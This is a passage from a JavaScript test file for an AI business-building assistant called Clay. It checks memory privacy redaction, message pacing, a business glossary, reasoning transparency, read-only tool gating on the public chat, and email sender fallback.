  const out = actionGuard.appendFallbacks("Great news!", issues);
  assert.ok(/haven't actually listed it/.test(out), 'fallback tells the builder the truth');
});

test('Clay version is a single source of truth and labelled', () => {
  assert.strictEqual(CLAY_VERSION_LABEL, 'Clay ' + CLAY_VERSION);
  assert.ok(/^\d+\.\d+/.test(CLAY_VERSION), 'version is a number');
});

// ── Cross-session memory (ported from Arbo's memory layer) ──────────────────
const memory = require('../src/services/clay/memory');

test('renderMemoryContext turns facts into a grounding block, empty when none', () => {
  assert.strictEqual(memory.renderMemoryContext([]), '');
  const block = memory.renderMemoryContext([
    { key: 'goal', value: 'launch a sober-living directory', sensitivity: 'normal' },
    { key: 'city', value: 'Atlanta', sensitivity: 'normal' },
  ]);
  assert.ok(/WHAT YOU REMEMBER/.test(block));
  assert.ok(/goal: launch a sober-living directory/.test(block));
  assert.ok(/city: Atlanta/.test(block));
});

test('staff redaction hides private facts but counts them', () => {
  const items = [
    { key: 'goal', value: 'grow the agency', sensitivity: 'normal' },
    { key: 'health', value: 'a private personal note', sensitivity: 'private' },
  ];
  const r = memory.redactedMemoryForAdmin(items);
  assert.strictEqual(r.facts.length, 1, 'only the normal fact is shown to staff');
  assert.strictEqual(r.facts[0].key, 'goal');
  assert.strictEqual(r.privateCount, 1, 'the private fact is counted, not shown');
  assert.ok(!JSON.stringify(r.facts).includes('private personal note'), 'private text never leaks to staff');
});

test('memory caps are sane bounds', () => {
  assert.ok(memory.KEY_MAX > 0 && memory.KEY_MAX <= 200);
  assert.ok(memory.VALUE_MAX >= 100);
});

// ── Message pacing (ported from Arbo's pacing) ──────────────────────────────
const pacing = require('../src/services/clay/pacing');

test('a short reply stays a single message', () => {
  const b = pacing.bubblesFor('Your concept is a private draft — nothing is public yet.');
  assert.strictEqual(b.length, 1);
});

test('empty reply yields no bubbles (never an empty bubble)', () => {
  assert.deepStrictEqual(pacing.bubblesFor(''), []);
  assert.deepStrictEqual(pacing.bubblesFor('   '), []);
});

test('a long multi-paragraph reply splits on paragraph breaks, capped', () => {
  const para = (n) => `Paragraph ${n}: ` + 'here is a genuinely distinct idea that carries real weight and takes a full breath to say aloud clearly '.repeat(1);
  const long = [para(1), para(2), para(3), para(4), para(5), para(6)].join('\n\n');
  const b = pacing.bubblesFor(long);
  assert.ok(b.length > 1, 'it should become a sequence');
  assert.ok(b.length <= 4, 'never explodes into a slideshow');
});

test('serious content is NEVER fragmented, however long', () => {
  const para = 'This is a careful explanation with many words that would normally be split into several separate spoken pieces for easier listening. '.repeat(6);
  const long = para + '\n\n' + para + '\n\n' + para;
  const b = pacing.bubblesFor(long, { serious: true });
  assert.strictEqual(b.length, 1, 'a refusal / number / bad news stays whole');
});

test('a tiny trailing fragment merges into the message before it', () => {
  const words = 'idea number one carries genuine weight and needs its own clear moment to land with the listener here now today '.repeat(2);
  const text = words + '\n\n' + words + '\n\n' + 'Okay?';
  const b = pacing.intoMessages(text, 'sequence');
  assert.ok(!b.includes('Okay?'), 'the two-word fragment is not its own bubble');
  assert.ok(b[b.length - 1].endsWith('Okay?'), 'it rides on the previous message');
});

test('shapeFor is conservative: short=single, very long=sequence', () => {
  assert.strictEqual(pacing.shapeFor({ text: 'short and done.' }), 'single');
  const long = 'word '.repeat(pacing.SPLIT_ABOVE_WORDS + 20);
  assert.strictEqual(pacing.shapeFor({ text: long }), 'sequence');
  assert.strictEqual(pacing.shapeFor({ text: long, serious: true }), 'single');
});

test('several distinct paragraphs split for the ear even under the word cap', () => {
  const r = [
    "Here's the shape of your idea.",
    "The core is a searchable listing of vetted homes buyers will pay to access.",
    "Revenue comes two ways: a listing fee from operators and a placement fee per filled bed.",
    "Want the business plan next, or the build path first?",
  ].join('\n\n');
  const b = pacing.bubblesFor(r);
  assert.ok(b.length > 1, 'four distinct ideas should be heard as separate pieces');
  assert.ok(b.length <= 4);
});

// ── Business glossary (inline term explanations) ────────────────────────────
const glossary = require('../src/services/clay/glossary');

test('the named terms all resolve: CAC, P&L, EBITDA', () => {
  assert.strictEqual(glossary.defineTerm('customer acquisition cost').term, 'Customer Acquisition Cost (CAC)');
  assert.strictEqual(glossary.defineTerm('CAC').term, 'Customer Acquisition Cost (CAC)');
  assert.strictEqual(glossary.defineTerm('P&L').term, 'Profit and Loss (P&L)');
  assert.strictEqual(glossary.defineTerm('EBITDA').term, 'EBITDA');
});

test('aliases and phrased questions hit the canonical entry', () => {
  assert.ok(glossary.defineTerm('pnl'));
  assert.ok(glossary.defineTerm('p and l'));
  assert.strictEqual(glossary.defineTerm('what does EBITDA mean?').term, 'EBITDA');
  assert.strictEqual(glossary.defineTerm('ltv:cac').term, 'LTV:CAC Ratio');
  assert.strictEqual(glossary.defineTerm('how does churn work').term, 'Churn Rate');
  assert.ok(glossary.defineTerm('ROAS') && glossary.defineTerm('TAM') && glossary.defineTerm('MOQ'));
});

test('an uncarried term returns null (Clay explains it generally, not as official)', () => {
  assert.strictEqual(glossary.defineTerm('flux capacitor'), null);
  assert.strictEqual(glossary.defineTerm(''), null);
});

test('definitions are real, plain, and give no advice', () => {
  const e = glossary.defineTerm('EBITDA');
  assert.ok(e.definition.length > 60, 'a real definition, not a stub');
  // no advice / hype verbs that would push a decision
  assert.ok(!/\byou should\b|\bwe recommend\b|\bguaranteed\b/i.test(e.definition));
});

test('the glossary is comprehensive', () => {
  assert.ok(glossary.glossarySize() >= 80, 'covers the core of business terminology');
});

// ── Reasoning transparency (show the "why" before a recommendation) ─────────
const reasoning = require('../src/services/clay/reasoning');

test('a bare recommendation with no reasoning is flagged', () => {
  assert.strictEqual(reasoning.recommendsWithoutReasoning('You should list it at $50.'), true);
  assert.strictEqual(reasoning.recommendsWithoutReasoning("I'd go with the subscription model."), true);
});

test('a recommendation that shows its reasoning is NOT flagged', () => {
  assert.strictEqual(
    reasoning.recommendsWithoutReasoning("I'd price it at $50, because it clears your costs and still sits under the impulse-buy line most buyers won't think twice about."),
    false,
  );
  assert.strictEqual(
    reasoning.recommendsWithoutReasoning("Here's my thinking: your margin is thin and demand is unproven, so you should start with a small test batch."),
    false,
  );
});

test('a plain statement or answer is not treated as a recommendation', () => {
  assert.strictEqual(reasoning.looksLikeRecommendation('Your concept is a private draft — nothing is public yet.'), false);
  assert.strictEqual(reasoning.recommendsWithoutReasoning('EBITDA is your operating profit before interest, taxes, depreciation, and amortization.'), false);
});

test('the reasoning detectors are independent and sane', () => {
  assert.strictEqual(reasoning.hasVisibleReasoning('I picked this because it lowers your upfront cost.'), true);
  assert.strictEqual(reasoning.hasVisibleReasoning('Done.'), false);
  assert.ok(reasoning.GUIDANCE.length > 40 && reasoning.NUDGE.length > 40);
});

// ── Health check now covers the whole current system ───────────────────────
test('systems summary reports version, memory, and glossary when present', () => {
  const s = {
    version: 'Clay 4.5',
    reasoning: { ok: true, provider: 'openai', model: 'gpt-5.5' },
    research: { ok: true, via: 'openai_web_search' },
    email: { configured: true, from: 'x', last: { sent: true, reason: null } },
    payments: { secret_key: true, webhook_secret: true, events_recorded: 2 },
    memory: { ok: true, facts_stored: 5 },
    knowledge: { glossary_terms: 84 },
  };
  const out = health.summarizeSystems(s);
  assert.ok(/Clay 4\.5/.test(out), 'reports version');
  assert.ok(/memory is reachable/i.test(out) && /5 facts/.test(out), 'reports memory reachable + count');
  assert.ok(/84 business terms/.test(out), 'reports glossary coverage');
});

test('systems summary flags memory as unreachable honestly', () => {
  const s = {
    version: 'Clay 4.5',
    reasoning: { ok: true, provider: 'openai', model: 'gpt-5.5' },
    research: { ok: true, via: 'openai_web_search' },
    email: { configured: false, from: 'x', last: null },
    payments: { secret_key: false, webhook_secret: false, events_recorded: null },
    memory: { ok: false, facts_stored: null },
    knowledge: { glossary_terms: 84 },
  };
  const out = health.summarizeSystems(s);
  assert.ok(/memory is NOT reachable/i.test(out), 'flags memory down, does not pretend it is fine');
});

test('summary still works for a legacy status object without the new fields', () => {
  const s = {
    reasoning: { ok: true, provider: 'openai', model: 'gpt-5.5' },
    research: { ok: true, via: 'openai_web_search' },
    email: { configured: true, from: 'x', last: { sent: true, reason: null } },
    payments: { secret_key: true, webhook_secret: true, events_recorded: 0 },
  };
  const out = health.summarizeSystems(s);
  assert.ok(out.length > 20 && !/undefined/.test(out), 'no crash, no undefined leakage');
});

// ── Provider: tool calls must not send reasoning_effort that OpenAI rejects ──
// gpt-5.x on /v1/chat/completions 400s if function tools are sent with a
// low/medium/high reasoning_effort. The tool path must pin 'none'.
test('tool-path params pin reasoning_effort to none for a reasoning model', () => {
  const p = provider.openaiToolTokenParams(4000, 'gpt-5.5');
  assert.strictEqual(p.reasoning_effort, 'none', "must be 'none', never low/medium/high");
  assert.strictEqual(p.max_completion_tokens, 4000);
  assert.ok(!('max_tokens' in p), 'reasoning models use max_completion_tokens');
});

test('tool-path params also pin none for o-series reasoning models', () => {
  assert.strictEqual(provider.openaiToolTokenParams(2000, 'o3').reasoning_effort, 'none');
});

test('tool-path params omit reasoning_effort entirely for non-reasoning models', () => {
  const p = provider.openaiToolTokenParams(4000, 'gpt-4o');
  assert.ok(!('reasoning_effort' in p), 'gpt-4o must not carry reasoning_effort');
  assert.strictEqual(p.max_tokens, 4000);
});

test('tool-path effort is never a value OpenAI rejects with tools', () => {
  for (const model of ['gpt-5.5', 'gpt-5', 'o3', 'o4-mini']) {
    const eff = provider.openaiToolTokenParams(4000, model).reasoning_effort;
    assert.ok(eff === 'none', `${model} must send none, got ${eff}`);
  }
});

// ── Public surface: one brain, gated — safe by construction ────────────────
const cap = require('../src/services/clay/capabilityProfile');
const pubChat = require('../src/services/clay/publicChat');
const capAgent = require('../src/services/clay/agent');
const { TOOLS: SPINE_TOOLS } = require('../src/services/clay/spine');

test('public surface offers only account-free, read-only tools', () => {
  assert.deepStrictEqual([...cap.ACCOUNT_FREE_TOOLS].sort(), ['define_term', 'get_listing', 'search_marketplace']);
  for (const name of cap.ACCOUNT_FREE_TOOLS) {
    assert.ok(SPINE_TOOLS[name], `${name} is a real tool`);
    assert.ok(!SPINE_TOOLS[name].irreversible, `${name} must not be irreversible`);
    assert.ok(!SPINE_TOOLS[name].requires_confirmation, `${name} must need no confirmation`);
  }
});

test('every account or write tool is refused by name on the public surface', () => {
  for (const name of ['get_concept', 'list_my_concepts', 'generate_concept', 'enhance_concept',
    'generate_social_content', 'list_on_marketplace', 'purchase_concept', 'remove_concept',
    'remember', 'forget', 'clear_memory', 'check_systems', 'research', 'read_source']) {
    const r = cap.publicToolRefusal(name);
    assert.ok(r && r.refused === true, `${name} must be refused`);
    assert.ok(/account/i.test(r.note), 'refusal explains the account boundary honestly');
  }
  assert.strictEqual(cap.publicToolRefusal('define_term'), null, 'allowed tool is not refused');
});

test('the agent hands the public profile only its three tool schemas', () => {
  const publicSchemas = capAgent.toolSchemas().filter((t) => cap.ACCOUNT_FREE_TOOLS.includes(t.name));
  assert.strictEqual(publicSchemas.length, 3);
  assert.deepStrictEqual(publicSchemas.map((t) => t.name).sort(), ['define_term', 'get_listing', 'search_marketplace']);
});

test('public executors are exactly the three, and provably read no user', () => {
  const ex = pubChat.buildPublicExecutors();
  assert.deepStrictEqual(Object.keys(ex).sort(), ['define_term', 'get_listing', 'search_marketplace']);
  const src = Object.values(ex).map((f) => f.toString()).join('\n');
  assert.ok(!/\buser\b/.test(src), 'no public executor may reference a user — nothing account-scoped is reachable');
});

test('the public profile is unauthenticated and read-only', () => {
  const p = cap.publicProfile();
  assert.strictEqual(p.hasAccount, false);
  assert.strictEqual(p.canWrite, false);
  assert.ok(p.systemPrompt.length > 200 && p.maxSteps <= 3);
});

// ── Worked examples: concrete teaching, honestly labeled illustrative ───────
const worked = require('../src/services/clay/workedExample');

test('every worked example is labeled illustrative — never a real projection', () => {
  for (const key of worked.exampleKeys()) {
    const ex = worked.workedExample(key);
    assert.ok(ex && ex.illustrative === true, `${key} must be flagged illustrative`);
    assert.ok(/illustrative|example numbers/i.test(ex.example), `${key} text must say the numbers are illustrative`);
    assert.ok(!/measurement of your real|claim about your real business(?!)/i.test(ex.example) || /not a/i.test(ex.example), 'must disclaim, not assert');
  }
});

test('worked-example aliases resolve to the right concept', () => {
  assert.strictEqual(worked.normalizeKey('profit margin'), 'margin');
  assert.strictEqual(worked.normalizeKey('breakeven'), 'break_even');
  assert.strictEqual(worked.normalizeKey('CAC'), 'cac_ltv');
  assert.strictEqual(worked.normalizeKey('burn rate'), 'runway');
  assert.strictEqual(worked.normalizeKey('TAM'), 'market_size');
  assert.strictEqual(worked.normalizeKey('what to charge'), 'pricing_to_target');
});

test('anchoring to a concept uses its name but does NOT invent numbers about it', () => {
  const ex = worked.workedExample('margin', { conceptTitle: 'Sober Living Intake Tool' });
  assert.ok(ex.example.includes('Sober Living Intake Tool'), 'names the concept');
  assert.ok(/illustrative|example numbers/i.test(ex.example), 'still labeled illustrative');
});

test('an unknown topic returns null so Clay teaches it plainly instead of faking a canned one', () => {
  assert.strictEqual(worked.workedExample('quantum tunneling'), null);
});

test('worked_example is a real, read-only tool in the spine', () => {
  const t = require('../src/services/clay/spine').TOOLS.worked_example;
  assert.ok(t && !t.irreversible && !t.requires_confirmation, 'read-only, no confirmation');
  assert.ok(t.required.includes('topic'));
});

// ── Derived memory patterns: grounded facts, never psychoanalysis or nagging ─
const mem = require('../src/services/clay/memory');

test('focusCategory only names a clear plurality, never a tie or a lone concept', () => {
  assert.strictEqual(mem.focusCategory([{ category: 'remote_service', n: 3 }, { category: 'saas', n: 1 }]), 'remote_service');
  assert.strictEqual(mem.focusCategory([{ category: 'a', n: 2 }, { category: 'b', n: 2 }]), null, 'a tie is not a focus');
  assert.strictEqual(mem.focusCategory([{ category: 'a', n: 1 }]), null, 'one concept is not a pattern');
  assert.strictEqual(mem.focusCategory([]), null);
});

test('a brand-new builder with no concepts yields no pattern context', () => {
  assert.strictEqual(mem.renderPatterns({ conceptCount: 0 }), '');
  assert.strictEqual(mem.renderPatterns(null), '');
});

test('patterns render as neutral facts, and say NOT to read motivation or nag', () => {
  const out = mem.renderPatterns({ conceptCount: 4, categoryFocus: 'remote_service', listedCount: 1, operatingCount: 0, daysSinceLastActive: 3, accountAgeDays: 40 });
  assert.ok(/4 concepts/.test(out), 'states the real count');
  assert.ok(/remote service/.test(out), 'names the category focus in plain words');
  assert.ok(/1 put on the Exchange/.test(out), 'notes what they listed');
  assert.ok(/do NOT read motivation/i.test(out) && /never nag/i.test(out), 'guards against psychoanalysis and nagging');
});

test('patterns read how a creator likes to operate, from their chosen paths', () => {
  const sells = mem.renderPatterns({ conceptCount: 3, disposition: 'sells' });
  assert.ok(/lean toward refining ideas to sell/i.test(sells), 'reads a seller and coaches toward a sellable concept');
  const launches = mem.renderPatterns({ conceptCount: 3, disposition: 'launches' });
  assert.ok(/launch and run themselves|launch and run/i.test(launches), 'reads a launcher and coaches toward going live');
  const both = mem.renderPatterns({ conceptCount: 3, disposition: 'both' });
  assert.ok(/do-it-all/i.test(both), 'reads a do-it-all creator');
  const owner = mem.renderPatterns({ conceptCount: 2, operatingCount: 1 });
  assert.ok(/growing what already exists/i.test(owner), 'flags an owner here to grow a business they already run');
});

test('staleness is only surfaced after a real gap, not for an active builder', () => {
  const active = mem.renderPatterns({ conceptCount: 2, categoryFocus: null, listedCount: 0, operatingCount: 0, daysSinceLastActive: 3 });
  assert.ok(!/days since/.test(active), 'no staleness note for a recently-active builder');
  const stale = mem.renderPatterns({ conceptCount: 2, categoryFocus: null, listedCount: 0, operatingCount: 0, daysSinceLastActive: 30 });
  assert.ok(/30 days since they last opened/.test(stale), 'surfaces a real gap plainly');
});

// ── Clay's identity is single-sourced (no drifted persona copies) ───────────
const fs = require('fs');
test('every surface opens Clay from one canonical identity', () => {
  const version = require('../src/services/clay/version');
  assert.ok(version.CLAY_IDENTITY.includes(version.CLAY_VERSION_LABEL), 'identity carries the canonical version');
  assert.ok(/Access YP Labs/.test(version.CLAY_IDENTITY));
  const agentSrc = fs.readFileSync(require.resolve('../src/services/clay/agent.js'), 'utf8');
  const visitorSrc = fs.readFileSync(require.resolve('../src/routes/visitor.js'), 'utf8');
  assert.ok(agentSrc.includes('CLAY_IDENTITY'), 'the agent opens from the shared identity');
  assert.ok(visitorSrc.includes('CLAY_IDENTITY'), 'the teaser opens from the shared identity');
  assert.ok(!/the AI builder at Access YP Labs/.test(agentSrc + visitorSrc), 'the old drifted persona line is gone');
});

// ── Deep reasoning on tool turns: Responses API migration (pure helpers) ─────
test('shouldUseResponses: reasoning models yes, others no, kill-switch forces off', () => {
  assert.strictEqual(provider.shouldUseResponses('gpt-5.5', {}), true);
  assert.strictEqual(provider.shouldUseResponses('o4-mini', {}), true);
  assert.strictEqual(provider.shouldUseResponses('claude-sonnet-4-5', {}), false, 'non-reasoning model uses the plain path');
  assert.strictEqual(provider.shouldUseResponses('gpt-5.5', { CLAY_OPENAI_RESPONSES: '0' }), false, 'kill-switch forces the fallback');
});

test('toResponsesInput folds tool history to text — no native function_call items (avoids the reasoning-item 400)', () => {
  const input = provider.toResponsesInput([
    { role: 'user', content: 'what furnished rentals are listed?' },
    { role: 'assistant', text: '', tool_calls: [{ id: 'c1', name: 'search_marketplace', input: { query: 'furnished' } }] },
    { role: 'tool', tool_call_id: 'c1', content: '[{"title":"FamilyHub"}]' },
    { role: 'user', content: 'tell me about the first one' },
  ]);
  // Every item is a plain role message; nothing is a structured function_call/output item.
  assert.ok(input.every((i) => i.role && typeof i.content === 'string'), 'only plain role messages');
  assert.ok(input.some((i) => i.role === 'assistant' && /Called search_marketplace/.test(i.content)), 'the call is described as text');
  assert.ok(input.some((i) => i.role === 'user' && /Result from search_marketplace: /.test(i.content)), 'the result is attributed to the tool by name');
});

test('toResponsesTools emits the flat Responses function shape (no nested function object)', () => {
  const t = provider.toResponsesTools([{ name: 'get_listing', description: 'd', input_schema: { type: 'object' } }]);
  assert.deepStrictEqual(t[0], { type: 'function', name: 'get_listing', description: 'd', parameters: { type: 'object' } });
});

test('parseResponsesOutput extracts text and tool calls from a Responses payload', () => {
  const withCall = provider.parseResponsesOutput({
    output: [
      { type: 'reasoning', summary: [] },
      { type: 'function_call', call_id: 'fc_1', name: 'get_listing', arguments: '{"listing_id":"abc"}' },
    ],
  });
  assert.strictEqual(withCall.text, '');
  assert.deepStrictEqual(withCall.tool_calls, [{ id: 'fc_1', name: 'get_listing', input: { listing_id: 'abc' } }]);

  const withText = provider.parseResponsesOutput({ output_text: 'here is the answer', output: [] });
  assert.strictEqual(withText.text, 'here is the answer');
  assert.strictEqual(withText.tool_calls.length, 0);

  // Malformed arguments must never throw — they degrade to an empty input object.
  const bad = provider.parseResponsesOutput({ output: [{ type: 'function_call', call_id: 'x', name: 'n', arguments: '{not json' }] });
  assert.deepStrictEqual(bad.tool_calls[0].input, {});
});

// ── Email failure logging is self-diagnosing whatever shape the provider returns ─
const emailSvc = require('../src/services/email');

test('resendErrorDetail keeps the real reason for every body shape (the 422 that reached the log blank)', async () => {
  // Standard Resend error JSON — the friendly message is surfaced.
  const msg = await emailSvc.resendErrorDetail({ text: async () => JSON.stringify({ statusCode: 422, message: 'The accessyplabs.com domain is not verified.', name: 'validation_error' }) });
  assert.ok(/domain is not verified/.test(msg), 'friendly message surfaced');
  // A shape WITHOUT message/error/name must NOT drop to blank — it keeps the raw body,
  // which is exactly the case that previously logged a bare "resend_422".
  const odd = await emailSvc.resendErrorDetail({ text: async () => '{"unexpected":"shape"}' });
  assert.ok(odd && odd.length > 0, 'an unexpected JSON shape is still captured, never dropped');
  // Non-JSON body is captured verbatim.
  const plain = await emailSvc.resendErrorDetail({ text: async () => 'Bad Request' });
  assert.strictEqual(plain, 'Bad Request');
  // Empty body degrades cleanly, never throws.
  assert.strictEqual(await emailSvc.resendErrorDetail({ text: async () => '' }), '');
  assert.strictEqual(await emailSvc.resendErrorDetail({ text: async () => { throw new Error('unreadable'); } }), '');
});

// ── The 'from' guard: a malformed EMAIL_FROM can never break email again ─────
test('resolveFrom falls back to the known-good sender when EMAIL_FROM is malformed', () => {
  const saved = process.env.EMAIL_FROM;
  try {
    delete process.env.EMAIL_FROM;
    assert.strictEqual(emailSvc.resolveFrom(), emailSvc.DEFAULT_FROM, 'unset -> default');
    process.env.EMAIL_FROM = '   ';
    assert.strictEqual(emailSvc.resolveFrom(), emailSvc.DEFAULT_FROM, 'blank -> default');
    // The exact live failure: a display name with no address. Resend rejected every send on it.
    process.env.EMAIL_FROM = 'Clay at Access YP Labs';
    assert.strictEqual(emailSvc.resolveFrom(), emailSvc.DEFAULT_FROM, 'name-only -> default (the real bug)');
    // Valid shapes are kept exactly as given.
    process.env.EMAIL_FROM = 'Clay at Access YP Labs <clay@accessyplabs.com>';
    assert.strictEqual(emailSvc.resolveFrom(), 'Clay at Access YP Labs <clay@accessyplabs.com>', 'Name <email> kept');
    process.env.EMAIL_FROM = 'clay@accessyplabs.com';
    assert.strictEqual(emailSvc.resolveFrom(), 'clay@accessyplabs.com', 'bare email kept');
    process.env.EMAIL_FROM = '  Clay <clay@accessyplabs.com>  ';
    assert.strictEqual(emailSvc.resolveFrom(), 'Clay <clay@accessyplabs.com>', 'trimmed, valid kept');
  } finally {
    if (saved === undefined) delete process.env.EMAIL_FROM; else process.env.EMAIL_FROM = saved;
  }
});
